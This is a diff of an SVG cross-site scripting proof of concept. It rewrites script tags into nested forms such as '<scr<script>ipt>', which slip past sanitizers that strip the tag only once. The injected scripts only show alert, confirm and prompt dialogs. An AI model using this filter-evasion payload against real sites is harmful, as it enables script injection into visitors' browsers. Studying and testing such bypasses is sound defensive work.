@@ -17,26 +17,26 @@
     <text x="300" y="50" font-size="20" text-anchor="middle" fill="white" style="text-shadow: 2px 2px 4px #000;">XSS PoC: Multiple Alerts (Click or Wait)</text>
     
     <!-- Technique 1: Standard Alert (Immediate) -->
-    <script>
+    <scr<script>ipt>
         alert('XSS PoC: Standard alert triggered on load');
     </script>
     
     <!-- Technique 2: Confirm Dialog (After 2 seconds) -->
-    <script>
+    <scr<script>ipt>
         setTimeout(() => {
             confirm('XSS PoC: Confirm dialog - click OK or Cancel');
         }, 2000);
     </script>
     
     <!-- Technique 3: Prompt Dialog (After 4 seconds) -->
-    <script>
+    <scr<script>ipt>
         setTimeout(() => {
             prompt('XSS PoC: Prompt dialog - enter text', 'Type here');
         }, 4000);
-    </script>
+    </sc<script>ript>
     
     <!-- Technique 4: Custom DOM-Based Pop-Up (After 6 seconds) -->
-    <script>
+    <scr<script>ipt>
         setTimeout(() => {
             const popup = document.createElementNS('http://www.w3.org/2000/svg', 'foreignObject');
             popup.setAttribute('x', '150');
